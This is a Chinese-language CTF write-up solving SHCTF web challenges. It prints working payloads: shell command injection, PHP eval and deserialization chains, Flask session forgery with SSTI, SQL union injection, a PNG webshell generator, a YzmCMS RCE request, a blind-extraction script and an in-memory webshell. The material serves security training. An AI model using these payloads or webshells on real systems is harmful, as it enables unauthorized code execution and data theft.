# Web

## **SHCTF** 

### [week1]ez_flask

查看robots.txt，看到提示

```
User-agent: *
Disallow: /s3recttt
```

访问/s3recttt，得到源代码

```python
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(name)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)

if name == 'main':
    app.run(debug=True)
```

直接注入即可 

```
/api?SSHCTFF=cat /flag
```



### [Week1] MD5 Master

```php
<?php
highlight_file(__file__);

$master = "MD5 master!";

if(isset($_POST["master1"]) && isset($_POST["master2"])){
    if($master.$_POST["master1"] !== $master.$_POST["master2"] && md5($master.$_POST["master1"]) === md5($master.$_POST["master2"])){
        echo $master . "<br>";
        echo file_get_contents('/flag');
    }
}
else{
    die("master? <br>");
}

```

工具：fastcoll

由代码可知，脚本通过

```
$master.$_POST["master1"]
```

将**MD5 master!**与post传入的**master1**和**master2**分别拼接后进行md5的强比较，要求拼接后的字符不相等且md5相等

工具使用方法：[教程](https://blog.csdn.net/m0_68483928/article/details/141252221)

md5转换php脚本：

```php
<?php 
function  readmyfile($path){
    $fh = fopen($path, "rb");
    $data = fread($fh, filesize($path));
    fclose($fh);
    return $data;
}
echo '二进制md5加密 '. md5( (readmyfile("1_msg1.txt")));

echo  'url编码 '. urlencode(readmyfile("1_msg1.txt"));

echo '二进制md5加密 '.md5( (readmyfile("1_msg2.txt")));

echo  'url编码 '.  urlencode(readmyfile("1_msg2.txt"));
```

*复制粘贴计算容易出问题*，故使用php脚本

计算结果删除掉MD5 master!后将结果post即可得到flag

### [Week1] jvav

显示在线执行java代码

写一个java脚本执行系统命令即可

官方题解：

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

class demo{
    public static void main(String[] args) {
        try {
            Process process = Runtime.getRuntime().exec("cat /flag");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
            process.waitFor();
            reader.close();
        } catch (Exception e) {
        }
    }
}
```

### [Week1] ez_gittt

查看源码发现有暗示

```
<!--你说这个Rxuxin会不会喜欢把自己的秘密写到git之类什么的--> 
```

dirsearch扫一下发现网站存在git泄漏，用Githack将git打包下载下来

查看log发现该版本去除了flag，需要进行版本回滚



<img src="assets/202411072208804.png" alt="官方题解" style="zoom:50%;" />

得到flag

### [Week1]单身十八年的手速

官方题解：需要点击超过520次拿到flag，查看页面源代码，引用了game.js，查看game.js的内容，发现是混淆过后的js，无需去混淆，直接定位520的hex值0x208，发现后面就是**alert**了一段字符串，base64解密拿到flag，有经验的可以直接定位**alert**



### [Week1] 蛐蛐？蛐蛐！

查看网页源代码，发现有暗示

```html
<!--听说，k1留了fault不想让你看到的源码在source.txt中-->
```

查看源码

```php
<?php
if($_GET['ququ'] == 114514 && strrev($_GET['ququ']) != 415411){
    if($_POST['ququ']!=null){
        $eval_param = $_POST['ququ'];
        if(strncmp($eval_param,'ququk1',6)===0){
            eval($_POST['ququ']);
        }else{
            echo("可以让fault的蛐蛐变成现实么\n");
        }
    }
    echo("蛐蛐成功第一步！\n");

}
else{
    echo("呜呜呜fault还是要出题");
}
```

观察源码

第一步根据php特性通过get传入**114514a**或者通过科学计数法即可绕过

第二步通过分号隔断即可，post传入**ququ=ququk1;system('cat /flag')**

### [Week1] poppopop

这个真不会，先放官方题解：

```php
<?php
class SH {

  public static $Web = false;
  public static $SHCTF = false;
}
class C {
  public $p;

  public function flag()
  {
    ($this->p)();
  }
}
class T{

  public $n;
  public function __destruct()
  {

    SH::$Web = true;
    echo "11";
  }
}
class F {
  public $o;
  public function __toString()
  {
    SH::$SHCTF = true;
    $this->o->flag();
    return "其实。。。。,";
  }
}
class SHCTF {
  public $isyou="system";
  public $flag="cat /f*";
  public function __invoke()
  {
    if (SH::$Web) {

      ($this->isyou)($this->flag);
      echo "小丑竟是我自己呜呜呜~";
    } else {
      echo "小丑别看了!";
    }
  }
}
$a =new T();
$a->n=new F();
$a->n->o=new C();
$a->n->o->p=new SHCTF();
echo base64_encode(serialize($a));
```



### [Week2]guess_the_number

查看网页源码，发现/s0urce，访问获得题目源码

```html
<!-- 看源码是做题的好习惯 -->  
<!-- /s0urce -->  
```

```python
import flask
import random
from flask import Flask, request, render_template, send_file

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html', first_num = first_num)  

@app.route('/source')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
    
@app.route('/first')
def get_first_number():
    return str(first_num)
    
@app.route('/guess')
def verify_seed():
    num = request.args.get('num')
    if num == str(second_num):
        with open("/flag", "r") as file:
            return file.read()
    return "nonono"
 
def init():
    global seed, first_num, second_num
    seed = random.randint(1000000,9999999)
    random.seed(seed)
    first_num = random.randint(1000000000,9999999999)
    second_num = random.randint(1000000000,9999999999)

init()
app.run(debug=True)
```

可以看到，题目给出了由random模块生成的第一个数，求出第二个数即可获得flag

**random伪随机数生成的数，是由seed进行数学运算得到的，题目设置了伪随机数的seed，且长度不大，因此只需要爆破出seed即可预测下一个数**

官方题解：

```python
import random

first_num = int(input(""))
for i in range(1000000,9999999,1):
    random.seed(i)
    num = random.randint(1000000000,9999999999)
    if num == first_num:
        second_num = random.randint(1000000000,9999999999)
        print("second_num: " + str(second_num))
        exit()
```

### 

### [Week2]入侵者禁入

```python
from flask import Flask, session, request, render_template_string

app = Flask(__name__)
app.secret_key = '0day_joker'

@app.route('/')
def index():
    session['role'] = {
        'is_admin': 0,
        'flag': 'your_flag_here'
    }
    with open(__file__, 'r') as file:
        code = file.read()
    return code

@app.route('/admin')
def admin_handler():
    try:
        role = session.get('role')
        if not isinstance(role, dict):
            raise Exception
    except Exception:
        return 'Without you, you are an intruder!'
    if role.get('is_admin') == 1:
        flag = role.get('flag') or 'admin'
        message = "Oh,I believe in you! The flag is: %s" % flag
        return render_template_string(message)
    else:
        return "Error: You don't have the power!"

if __name__ == '__main__':
    app.run('0.0.0.0', port=80)
```

代码审计后可知，这是一道关于session伪造的题目，已知**secret_key = '0day_joker'**

工具：[flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)

```cmd
D:\tools\exploit\python\flask-session-cookie-manager>python flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZvZ8IQ.B9Q1a7gFQvzs4Q3bGldXuiGHULg" -s "0day_joker"

D:\tools\exploit\python\flask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"

D:\tools\exploit\python\flask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"

D:\tools\exploit\python\flask-session-cookie-manager>python flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"
```

通过session伪装使**is_admin==1**并通过**ssti注入**即可得到flag

ssti注入语句

```python
{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}
```



### [Week2]自助查询

**sql注入语句拼接题**

题目给出的语句：

```sqlite
SELECT username,password FROM users WHERE id = ("
```

通过sql联合注入即可解决本题

第一步：**查询数据库名**

```sqlite
-1") union select 1,database()
```

可得

```sqlite
| Username | Password |
| -------- | -------- |
| 1        | ctf      |
```

第二步：**查询表名**

```sqlite
-1") union select  1,table_name from information_schema.tables where table_schema='ctf'
```

可得

```sqlite
| Username | Password |
| -------- | -------- |
| 1        | flag     |
| 1        | users    |
```

第三步：**查询列名**

```sqlite
1") union select 1,column_name from information_schema.columns where table_schema='ctf' and table_name='flag'
```

可得

```sqlite
| Username | Password  |
| -------- | --------- |
| admin    | admin123  |
| 1        | id        |
| 1        | scretdata |
```

第四步：**查询列表中的内容**

```sqlite
-1") union select 1,group_concat(id,0x7e,scretdata) from ctf.flag
```

可得

```sqlite
| Username | Password                                                  |
| -------- | --------------------------------------------------------- |
| 1        | 1~被你查到了, 果然不安全,2~把重要的东西写在注释就不会忘了 |
```

直接查询注释即可得到flag

```sqlite
-1") union select 1,column_comment from information_schema.columns
```

### [week3]拜师之旅·番外

这是一道图片上传题，以下是对常见图片上传漏洞的归纳

![mind-map](assets/202411072207514.png)

当上传一张图片成功后,查看图片可以发现是通过GET传文件路径来显示的,考虑存在include包含。并且根据题目描述尝试下载图片回来对比会发现上传与下载的图片数据不一致,存在二次渲染

此时需要构造一张不被渲染掉的png图片马，以下是国外大佬的生成脚本：

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
           
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,'1.png');  //要修改的图片的路径
 
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */ 
?>
```

将构造好的图片马上传,并在查看图片页面进行命令执行

GET  :靶机地址/?image=/upload/293146324.png`&0=system`

POST:`1=tac /f*`

执行一次后再重新下载图片回来即可得到回显 

![https://mmbiz.qpic.cn/mmbiz_png/crOK73kjDuiaCYofiaN8P1yvfgjTKEPdNboDic8UNszZeqNhQngJtegGvASGNJnl4L3IQNVdTwEQdye16NTnE6lhg/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1](assets/202411072207387.png ) 

### [week3]小小cms

在网上找到现成YzmCMS的REC漏洞的`POC`，直接bp执行即可得到flag

```php
POST /yzmcms-7.0/pay/index/pay_callback HTTP/1.1
Host: 靶机地址
Cookie: ;XDEBUG_SESSION=19079
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

out_trade_no[0]=eq&out_trade_no[1]=cat /flag&out_trade_no[2]=exec

```

*POST:out_trade_no[0]=eq&out_trade_no[1]=`cat /flag`&out_trade_no[2]=exec*

关于该漏洞的文章：[点击打开](https://blog.csdn.net/shelter1234567/article/details/138524342)

### [week3]love_flask

源码如下：

```python
from flask import Flask, request, render_template_string
app = Flask(__name__)

# 定义根路由（'/'）的处理函数
@app.route('/')
def pretty_input():
    # 返回渲染后的html模板字符串内容，这里假设html_template是在别处定义好的包含HTML内容的模板字符串
    return render_template_string(html_template)

# 定义'/namelist'路由的处理函数，该路由只接受GET方法请求
@app.route('/namelist', methods=['GET'])
def name_list():
    # 从GET请求的参数中获取名为'name'的值
    name = request.args.get('name')

    # 根据获取到的'name'值创建一个简单的HTML片段，其中包含一个<h1>标签和问候语
    template = '<h1>Hi, %s.</h1>' % name
    # 使用render_template_string函数对创建的HTML片段进行渲染
    rendered_string = render_template_string(template)
    if rendered_string:
        # 如果渲染成功，返回表示成功将名字写入数据库的消息（这里实际可能并没有真正写入数据库的操作，只是模拟这种反馈）
        return 'Success Write your name to database'
    else:
        # 如果渲染失败，返回'Error'
        return 'Error'

# 当脚本作为主程序运行时（即模块名为'__main__'）
if __name__ == '__main__':
    # 在本地的8080端口启动Flask应用
    app.run(port=8080)
```

通过代码，我们可知这道题是一道ssti模板注入的题目，但由于没有return，ssti的结果没有回显。

我们可以通过 `url_for` 的一些内部机制来动态导入 `os` 模块，并执行 `popen('ls')` 然后读取结果，最后将其关联到一个特定的 URL 路由 `/1333337` 上

Payload:?name={{url_for.__globals__.current_app.add_url_rule('/1333337',view_func=url_for.__globals__.__builtins__['__import__']('os').popen('`cat /flag`').read)}}

访问路由/1333337查看回显，得到flag

**官方题解：**

题解一：时间盲注。

因为渲染失败会返回500，所以可以先爆出eval

```python
/namelist?name={{().__class__.__base__.__subclasses__()[{{int(100-200)}}].__init__.__globals__['__builtins__']['eval']('__import__("time").sleep(3)')}}
```

![图片](assets/640-20241107133834727)

接着通过构造延时来爆flag

```python
import requests
import time
flag ='SHCTF{'
table = '-ABCDEFabcdef0123456789'
url = 'http://210.44.150.15:25528/namelist?name='
for len in range(7,43):
    for i in table:
      ii = flag +i
      start_time = time.time()
      data = "{{"+"().__class__.__base__.__subclasses__()[100].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"if [ $(head -c {} /flag) = {} ]; then sleep 2; fi\").read()')".format(len,ii) +"}}"
      #print(data)
      url1 = url + data
      r = requests.get(url1)
      end_time = time.time()
      response_time = end_time - start_time
      if response_time >= 2:
          flag = flag +i
          print(flag)
      else:
          continue
print(flag+'}')
```

第二种：内存马  [参考文章](https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD)

内存马无需上传文件也不生成文件。内存马通过动态注册一个路由来作为执行命令参数的入口。

```python
 {{url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}
```

<img src="assets/640" alt="图片" style="zoom:150%;" />

得到flag



